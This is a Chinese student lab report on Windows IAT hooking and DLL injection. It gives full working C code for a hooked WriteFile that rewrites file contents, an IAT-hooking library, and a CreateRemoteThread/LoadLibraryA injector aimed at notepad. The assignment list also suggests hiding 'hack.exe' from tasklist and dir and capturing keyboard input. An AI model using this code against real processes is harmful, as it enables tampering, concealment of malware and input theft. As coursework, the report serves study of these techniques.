# 大作业

##  实验要求（选之一）

+ hook writefile，使得每次写文件时，如果每次写的文件的“哈哈哈”，改为“呵呵呵”，并验证hook是否正确
+ 把这个文件写为dll，通过下午的示例代码注入到notepad类似进程中，进行hook，hook完之后实验hook是否成功，写一个“哈哈哈”进入txt中，再打开后变为了“呵呵呵”，同理可以去改`findfirstfile`进行dir时，只要出现“hack.exe”就把这个结果抹掉
+ 实现系统进程`tasklist`遍历不到`hack.exe`这个进程
+ 利用`setwindowtext`不改输出，但是记录计算器的输出，实现屏幕取词
+ 接管其他进程，接管键盘的输入，注入到微信进程文本框输入
+ 通过`线程注入技术`和`IAThook`技术的综合使用(进行记事本和，dir,计算器)

## 实验原理

+ 通过`线程注入技术`和`IAThook`技术的综合使用进行对`notepad`进行注入

## 实验过程

### notepad注入

+ 由于`notepad`保存数据使用的是`writefile`函数，因此我们要想进行注入，要篡改的就是`writefile`的函数地址，并且将地址重定向到我们自己写的`writefile`函数中

+ 接下来我们先仿造上一个实验中`假的MessageboxA`，写一个假的writefile函数

  ```c
  #include <windows.h>
  LONG IATHook(
  	__in_opt void* pImageBase,
  	__in_opt const char* pszImportDllName,
  	__in const char* pszRoutineName,
  	__in void* pFakeRoutine,
  	__out HANDLE* phHook
  );
  
  LONG UnIATHook(__in HANDLE hHook);
  
  void* GetIATHookOrign(__in HANDLE hHook);
  
  typedef bool(__stdcall *LPFN_WriteFile)(
  	HANDLE       hFile,
  	LPCVOID      lpBuffer,
  	DWORD        nNumberOfBytesToWrite,
  	LPDWORD      lpNumberOfBytesWritten,
  	LPOVERLAPPED lpOverlapped
  	);
  
  HANDLE g_hHook_WriteFile = NULL;
  //////////////////////////////////////////////////////////////////////////
  
  bool __stdcall Fake_WriteFile(
  	HANDLE       hFile,
  	LPCVOID      lpBuffer,
  	DWORD        nNumberOfBytesToWrite,
  	LPDWORD      lpNumberOfBytesWritten,
  	LPOVERLAPPED lpOverlapped
  ) {
  	LPFN_WriteFile fnOrigin = (LPFN_WriteFile)GetIATHookOrign(g_hHook_WriteFile);
      
  	char DataBuffer[] = "呵呵呵";//将输出内容改为“呵呵呵”
  	DWORD dwBytesToWrite = (DWORD)strlen(DataBuffer);
  	DWORD dwBytesWritten = 0;
  
  	return fnOrigin(hFile, DataBuffer, dwBytesToWrite, &dwBytesWritten, lpOverlapped);
  }
  ```

+ 接着将导入表中的`writefile`函数hook到自己写的`fake_writefile`函数中，参考上次实验的示例

  ![](./image/示例.png)

  

+ 仿造上次实验中的`main.c`文件，代码如下

  ```c
  #include <windows.h>
  
  
  LONG IATHook(
  	__in_opt void* pImageBase,
  	__in_opt char* pszImportDllName,
  	__in char* pszRoutineName,
  	__in void* pFakeRoutine,
  	__out HANDLE* phHook
  );
  
  LONG UnIATHook(__in HANDLE hHook);
  
  void* GetIATHookOrign(__in HANDLE hHook);
  
  //typedef int(__stdcall* LPFN_MessageBoxA)(__in_opt HWND hWnd, __in_opt char* lpText, __in_opt char* lpCaption, __in UINT uType);
  typedef int(__stdcall* LPFN_WriteFile)(__in_opt HANDLE hFile, __in_opt LPCVOID      lpBuffer, __in_opt DWORD        nNumberOfBytesToWrite, __in LPDWORD      lpNumberOfBytesWritten, __in LPOVERLAPPED lpOverlapped);
  HANDLE g_hHook_WriteFile = NULL;
  //HANDLE g_hHook_MessageBoxA = NULL;
  //////////////////////////////////////////////////////////////////////////
  int __stdcall Fake_WriteFile(
  	HANDLE       hFile,
  	LPCVOID      lpBuffer,
  	DWORD        nNumberOfBytesToWrite,
  	LPDWORD      lpNumberOfBytesWritten,
  	LPOVERLAPPED lpOverlapped
  ) {
  	LPFN_WriteFile fnOrigin = (LPFN_WriteFile)GetIATHookOrign(g_hHook_WriteFile);
  
  	char DataBuffer[] = "呵呵呵";//将输出内容改为“呵呵呵”
  	DWORD dwBytesToWrite = (DWORD)strlen(DataBuffer);
  	DWORD dwBytesWritten = 0;
  
  	return fnOrigin(hFile, DataBuffer, dwBytesToWrite, &dwBytesWritten, lpOverlapped);
  }
  //int __stdcall Fake_MessageBoxA(__in_opt HWND hWnd, __in_opt char* lpText, __in_opt char* lpCaption, __in UINT uType)
  //{
  //	LPFN_MessageBoxA fnOrigin = (LPFN_MessageBoxA)GetIATHookOrign(g_hHook_MessageBoxA);
  //
  //	return fnOrigin(hWnd, "hook", lpCaption, uType);
  //}
  
  int __cdecl wmain(int nArgc, WCHAR** Argv)
  {
  	do
  	{
  		UNREFERENCED_PARAMETER(nArgc);
  		UNREFERENCED_PARAMETER(Argv);
  
  		IATHook(
  			GetModuleHandle(NULL),
  			"kernel32.dll",
  			"WriteFile",
  			Fake_WriteFile,
  			&g_hHook_WriteFile
  		);
         
  		//MessageBoxA(NULL, "test", "caption", 0);
  
  		//UnIATHook(g_hHook_MessageBoxA);
  
  		//MessageBoxA(NULL, "test", "caption", 0);
  
  	} while (FALSE);
  
  	return 0;
  }
  
  ```

+ 修改上次实验中的`IATHook.c`文件的代码

  ```c
  // windows IATHook for kernelmode and usermode 
  // by TinySec( root@tinysec.net )
  // you can free use this code , but if you had modify , send a copy to to my email please.
  
  
  
  /*
  LONG IATHook
  (
  	__in void* pImageBase ,
  	__in_opt char* pszImportDllName ,
  	__in char* pszRoutineName ,
  	__in void* pFakeRoutine ,
  	__out HANDLE* Param_phHook
  );
  
  LONG UnIATHook( __in HANDLE hHook );
  
  void* GetIATHookOrign( __in HANDLE hHook );
  */
  
  
  //////////////////////////////////////////////////////////////////////////
  
  #ifdef _RING0
  	#include <ntddk.h>
  	#include <ntimage.h>
  #else
  	#include <windows.h>
  	#include <stdlib.h>
  #endif //#ifdef _RING0
  
  
  //////////////////////////////////////////////////////////////////////////
  
  typedef struct _IATHOOK_BLOCK
  {
  	void*	pOrigin;
  
  	void*	pImageBase;
  	char*	pszImportDllName;
  	char*	pszRoutineName;
  
  	void*	pFake;
  	
  }IATHOOK_BLOCK;
  
  
  //////////////////////////////////////////////////////////////////////////
  
  void* _IATHook_Alloc(__in ULONG nNeedSize)
  {
  	void* pMemory = NULL;
  
  	do 
  	{
  		if ( 0 == nNeedSize )
  		{
  			break;
  		}
  		
  #ifdef _RING0
  		pMemory = ExAllocatePoolWithTag( NonPagedPool , nNeedSize , 'iath' );
  
  #else
  		pMemory = malloc( nNeedSize );
  #endif // #ifdef _RING0
  		
  		if ( NULL == pMemory )
  		{
  			break;
  		}
  
  		RtlZeroMemory( pMemory , nNeedSize );
  
  	} while (FALSE);
  
  	return pMemory;
  }
  
  
  ULONG _IATHook_Free(__in void* pMemory )
  {
  
  	do 
  	{
  		if ( NULL == pMemory )
  		{
  			break;
  		}
  		
  #ifdef _RING0
  		ExFreePool( pMemory );
  		
  #else
  		free( pMemory );
  #endif // #ifdef _RING0
  		
  		pMemory = NULL;
  		
  	} while (FALSE);
  	
  	return 0;
  }
  
  //////////////////////////////////////////////////////////////////////////
  #ifdef _RING0
  
  
  #ifndef LOWORD
  	#define LOWORD(l)           ((USHORT)((ULONG_PTR)(l) & 0xffff))
  #endif // #ifndef LOWORD
  
  
  void*  _IATHook_InterlockedExchangePointer(__in void* pAddress , __in void* pValue )
  {
  	void*	pWriteableAddr=NULL;
  	PMDL	pNewMDL = NULL;
  	void*	pOld =  NULL;
  	
  	do 
  	{
  		if (  (NULL == pAddress)  )
  		{
  			break;
  		}
  		
  		if ( !NT_SUCCESS(MmIsAddressValid(pAddress)) )
  		{
  			break;
  		}
  		
  		pNewMDL = IoAllocateMdl(pAddress , sizeof(void*) , FALSE , FALSE , NULL);
  		if (pNewMDL == NULL)
  		{
  			break;
  		}
  		
  		__try
  		{
  			MmProbeAndLockPages(pNewMDL, KernelMode, IoWriteAccess);
  			
  			pNewMDL->MdlFlags |= MDL_MAPPING_CAN_FAIL;
  			
  			pWriteableAddr = MmMapLockedPagesSpecifyCache(
  					pNewMDL ,
  					KernelMode ,
  					MmNonCached ,
  					NULL ,
  					FALSE ,
  					HighPagePriority 
  			);
  
  			//pWriteableAddr = MmMapLockedPages(pNewMDL, KernelMode);
  		}
  		__except(EXCEPTION_EXECUTE_HANDLER)
  		{
  			break;
  		}
  		
  		if (pWriteableAddr == NULL) 
  		{
  			MmUnlockPages(pNewMDL);
  			IoFreeMdl(pNewMDL);
  			
  			break;
  		}
  		
  		pOld = InterlockedExchangePointer( pWriteableAddr , pValue);
  		
  		MmUnmapLockedPages(pWriteableAddr,pNewMDL);
  		MmUnlockPages(pNewMDL);
  		IoFreeMdl(pNewMDL);
  		
  	} while (FALSE);
  	
  	return pOld;
  }
  
  
  //////////////////////////////////////////////////////////////////////////
  #else
  
  void*  _IATHook_InterlockedExchangePointer(__in void* pAddress , __in void* pValue )
  {
  	void*	pWriteableAddr=NULL;
  	void*	nOldValue =  NULL;
  	ULONG	nOldProtect = 0;
  	BOOL	bFlag = FALSE;
  	
  	do 
  	{
  		if (  (NULL == pAddress)  )
  		{
  			break;
  		}
  		
  		bFlag = VirtualProtect( pAddress , sizeof(void*) , PAGE_EXECUTE_READWRITE , &nOldProtect );
  		if ( !bFlag )
  		{
  			break;
  		}
  		pWriteableAddr = pAddress;
  		
  		nOldValue = InterlockedExchangePointer( pWriteableAddr , pValue );
  		
  		VirtualProtect( pAddress , sizeof(void*) , nOldProtect , &nOldProtect );
  		
  	} while (FALSE);
  	
  	return nOldValue;
  }
  
  #endif // #ifdef _RING0
  
  
  LONG _IATHook_Single
  (
  	__in IATHOOK_BLOCK*	pHookBlock ,
  	__in IMAGE_IMPORT_DESCRIPTOR*	pImportDescriptor ,
  	__in BOOLEAN bHook
  )
  {
  	LONG				nFinalRet = -1;
  
  	IMAGE_THUNK_DATA*	pOriginThunk = NULL;
  	IMAGE_THUNK_DATA*	pRealThunk = NULL;
  
  	IMAGE_IMPORT_BY_NAME*	pImportByName = NULL;
  
  	do 
  	{
  		pOriginThunk = (IMAGE_THUNK_DATA*)( (UCHAR*)pHookBlock->pImageBase + pImportDescriptor->OriginalFirstThunk );
  		pRealThunk = (IMAGE_THUNK_DATA*)( (UCHAR*)pHookBlock->pImageBase + pImportDescriptor->FirstThunk );
  
  		for ( ;  0 != pOriginThunk->u1.Function; pOriginThunk++ , pRealThunk++ )
  		{
  			if ( IMAGE_ORDINAL_FLAG == ( pOriginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG ) )
  			{
  				if ( (USHORT)pHookBlock->pszRoutineName == LOWORD( pOriginThunk->u1.Ordinal) )
  				{
  					if ( bHook )
  					{
  						pHookBlock->pOrigin = (void*)pRealThunk->u1.Function;
  						_IATHook_InterlockedExchangePointer( (void**)&pRealThunk->u1.Function , pHookBlock->pFake );
  					}
  					else
  					{
  						_IATHook_InterlockedExchangePointer( (void**)&pRealThunk->u1.Function , pHookBlock->pOrigin );
  					}
  
  					nFinalRet = 0; 
  					break;
  				}
  			}
  			else
  			{
  				pImportByName = (IMAGE_IMPORT_BY_NAME*)( (char*)pHookBlock->pImageBase + pOriginThunk->u1.AddressOfData );
  
  				if ( 0 == _stricmp( pImportByName->Name ,  pHookBlock->pszRoutineName ) )
  				{	
  					if ( bHook )
  					{
  						pHookBlock->pOrigin = (void*)pRealThunk->u1.Function;
  						_IATHook_InterlockedExchangePointer( (void**)&pRealThunk->u1.Function , pHookBlock->pFake );
  					}
  					else
  					{
  						_IATHook_InterlockedExchangePointer( (void**)&pRealThunk->u1.Function , pHookBlock->pOrigin );
  					}
  
  					nFinalRet = 0;
  
  					break;
  				}
  			}
  
  		}
  		
  	} while (FALSE);
  
  	return nFinalRet;
  }
  
  
  LONG _IATHook_Internal( __in IATHOOK_BLOCK* pHookBlock , __in BOOLEAN bHook)
  {
  	LONG				nFinalRet = -1;
  	LONG				nRet = -1;
  	IMAGE_DOS_HEADER*	pDosHeader = NULL;
  	IMAGE_NT_HEADERS*	pNTHeaders = NULL;
  
  	IMAGE_IMPORT_DESCRIPTOR*	pImportDescriptor = NULL;
  	char*						pszImportDllName = NULL;
  
  	
  	do 
  	{
  		if ( NULL == pHookBlock )
  		{
  			break;
  		}
  		
  		pDosHeader = (IMAGE_DOS_HEADER*)pHookBlock->pImageBase;
  		if ( IMAGE_DOS_SIGNATURE != pDosHeader->e_magic )
  		{
  			break;
  		}
  		
  		pNTHeaders = (IMAGE_NT_HEADERS*)( (UCHAR*)pHookBlock->pImageBase + pDosHeader->e_lfanew );
  		if ( IMAGE_NT_SIGNATURE != pNTHeaders->Signature )
  		{
  			break;
  		}
  		
  		if ( 0 == pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress )
  		{
  			break;
  		}
  		
  		if ( 0 == pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size )
  		{
  			break;
  		}
  		
  		pImportDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)( (UCHAR*)pHookBlock->pImageBase + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress );
  		
  		
  		// Find pszRoutineName in every Import descriptor
  		nFinalRet = -1;
  
  		for (  ;  (pImportDescriptor->Name != 0 );  pImportDescriptor++ )
  		{
  			pszImportDllName = (char*)pHookBlock->pImageBase + pImportDescriptor->Name;
  
  			if ( NULL != pHookBlock->pszImportDllName )
  			{
  				if ( 0 != _stricmp(pszImportDllName , pHookBlock->pszImportDllName) )
  				{
  					continue;
  				}
  			}
  			
  			nRet = _IATHook_Single(
  				pHookBlock,
  				pImportDescriptor,
  				bHook
  			);
  			
  			if ( 0 == nRet )
  			{
  				nFinalRet = 0;
  				break;
  			}
  		}
  			
  	} while (FALSE);
  	
  	return nFinalRet;
  }
  
  LONG IATHook
  (
  	__in void* pImageBase ,
  	__in_opt char* pszImportDllName ,
  	__in char* pszRoutineName ,
  	__in void* pFakeRoutine ,
  	__out HANDLE* Param_phHook
  )
  {
  	LONG				nFinalRet = -1;
  	IATHOOK_BLOCK*		pHookBlock = NULL;
  	
  	
  	do 
  	{
  		if ( (NULL == pImageBase) || (NULL == pszRoutineName) || (NULL == pFakeRoutine) )
  		{
  			break;
  		}
  		
  		pHookBlock = (IATHOOK_BLOCK*)_IATHook_Alloc( sizeof(IATHOOK_BLOCK) );
  		if ( NULL == pHookBlock )
  		{
  			break;
  		}
  		RtlZeroMemory( pHookBlock , sizeof(IATHOOK_BLOCK) );
  		
  		pHookBlock->pImageBase = pImageBase;
  		pHookBlock->pszImportDllName = pszImportDllName;
  		pHookBlock->pszRoutineName = pszRoutineName;
  		pHookBlock->pFake = pFakeRoutine;
  		
  		__try
  		{
  			nFinalRet = _IATHook_Internal(pHookBlock , TRUE);
  		}
  		__except(EXCEPTION_EXECUTE_HANDLER)
  		{
  			nFinalRet = -1;
  		}
  		
  	} while (FALSE);
  	
  	if ( 0 != nFinalRet )
  	{
  		if ( NULL != pHookBlock )
  		{
  			_IATHook_Free( pHookBlock );
  			pHookBlock = NULL;
  		}
  	}
  
  	if ( NULL != Param_phHook )
  	{
  		*Param_phHook = pHookBlock;
  	}
  
  	return nFinalRet;
  }
  
  LONG UnIATHook( __in HANDLE hHook )
  {
  	IATHOOK_BLOCK*		pHookBlock = (IATHOOK_BLOCK*)hHook;
  	LONG				nFinalRet = -1;
  
  	do 
  	{
  		if ( NULL == pHookBlock )
  		{
  			break;
  		}
  		
  		__try
  		{
  			nFinalRet = _IATHook_Internal(pHookBlock , FALSE);
  		}
  		__except(EXCEPTION_EXECUTE_HANDLER)
  		{
  			nFinalRet = -1;
  		}
  			
  	} while (FALSE);
  
  	if ( NULL != pHookBlock )
  	{
  		_IATHook_Free( pHookBlock );
  		pHookBlock = NULL;
  	}
  
  	return nFinalRet;
  }
  
  void* GetIATHookOrign( __in HANDLE hHook )
  {
  	IATHOOK_BLOCK*		pHookBlock = (IATHOOK_BLOCK*)hHook;
  	void*				pOrigin = NULL;
  	
  	do 
  	{
  		if ( NULL == pHookBlock )
  		{
  			break;
  		}
  		
  		pOrigin = pHookBlock->pOrigin;
  			
  	} while (FALSE);
  	
  	return pOrigin;
  }
  
  
  ```

+ 修改vs中的属性如下

  ![](./image/dll.png)

  ![](./image/exp.png)

+ 生成dll，生成的dll在`D:\大三上\软件项目开发安全周期\课后实验\大作业\note_IAT\Debug`目录下

  ![](./image/生成dll.png)
  
  ![](./image/iat.png)
  
+ 接着新建一个项目'`note.c`，目录为`D:\大三上\软件项目开发安全周期\课后实验\大作业\note\note`，通过上上次实验的基础将dll注入到进程遍历的代码中，并且将生成的dll文件放到该项目的目录之下（通过网上示例代码修改得到）

  ```c
  #include <windows.h>
  #include <stdio.h>
  #include <tlhelp32.h>
  #include <tchar.h>
  #include <strsafe.h>
  
  int main() {
  	char szDllName[] = "note_IAT.dll";
  	char szExeName[] = "notepad.exe";
  
  
  	PROCESSENTRY32 ProcessEntry = {1};
  	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
  	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  	int bRet = Process32First(hProcessSnap, &ProcessEntry);
  	DWORD dwProcessId = 0;
  	while (bRet) {
  		if (strcmp(szExeName, ProcessEntry.szExeFile) == 0) {
  			dwProcessId = ProcessEntry.th32ProcessID;
  			break;
  		}
  		bRet = Process32Next(hProcessSnap, &ProcessEntry);
  	}
  	if (0 == dwProcessId) {
  		printf("找不到进程\n");
  		return 1;
  	}
  
  	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
  	if (0 == hProcess) {
  		printf("无法打开进程\n");
  		return 1;
  	}
  
  	
  	size_t length = strlen(szDllName) + 1;
  	char* pszDllFile = (char*)VirtualAllocEx(hProcess, NULL, length, MEM_COMMIT, PAGE_READWRITE);
  	if (0 == pszDllFile) {
  		printf("远程空间分配失败\n");
  		return 1;
  	}
  
  	
  	if (!WriteProcessMemory(hProcess, (PVOID)pszDllFile, (PVOID)szDllName, length, NULL)) {
  		printf("远程空间写入失败\n");
  		return 1;
  	}
  
  	
  	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");
  	if (0 == pfnThreadRtn) {
  		printf("LoadLibraryA函数地址获取失败\n");
  		return 1;
  	}
  
  
  	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, (PVOID)pszDllFile, 0, NULL);
  	if (0 == hThread) {
  		printf("远程线程创建失败\n");
  		return 1;
  	}
  
  	
  	WaitForSingleObject(hThread, INFINITE);
  	printf("远程线程执行成功!\n");
  
  	VirtualFreeEx(hProcess, (PVOID)pszDllFile, 0, MEM_RELEASE);
  	CloseHandle(hThread);
  	CloseHandle(hProcess);
  
  	return 0;
  }
  ```

  

+ 进程遍历时，如果我们找到了`notepad.exe`,则对它进行远程注入，需要注意的是我们的程序是32位的，只能新建32位的远程程序，所以启动的应该是32位的notepad！！

+ 因此我们先启动`notepad.exe`，让该进程去遍历到这个进程，我们发现在任务管理器中可以看到这个进程

  ![](./image/任务管理器中.png)

+ 接着执行我们创建的note.exe，在里面写入“哈哈哈”字样，并保存， 同时执行刚刚的note.exe
  
  ![](./image/哈哈哈哈.png)
  
  ![](./image/exe.png)
  
+ 再次打开txt文件，会发现文件中变成了 “呵呵呵”字样

  ![](./image/呵呵呵.png)

+ 在执行的过程中，有趣的是，我前两天用来修复电脑驱动的360软件也“跳”了出来，估计是识别出了代码注入，突然意识到自己是在进行攻击！

  ![](./image/360.png)

+ 至此，实验已经完成了代码注入











## 实验总结

+ 所谓DLL 注入就是将一个DLL放进某个进程的地址空间里，让它成为那个进程的一部分。要实现DLL注入，首先需要打开目标进程。
+ 代码注入又称线程注入。利用createremoteprocess（）函数以远程线程形式运行代码。必须将代码和数据同时注入（数据以参数的形式注入）。
+ 进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。
+ DLL（Dynamic Linked Library动态链接库）被加载到进程后会自动运行DllMain()函数，用户可以把想执行的代码放到DllMain()函数，每当加载DLL时，添加的代码就会自然而然得到执行。











## 实验参考资料

+ [hidden file](https://github.com/RachelLYY/IatHook_FileHidden)
+ [IAT HOOK](https://github.com/tinysec/iathook/blob/master/IATHook.c)
+ [createremoteprocess](https://bbs.csdn.net/topics/391876819)
+ [createremoteprocess msdn](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
+ [dll注入总结](https://blog.csdn.net/weixin_40039738/article/details/82354085)







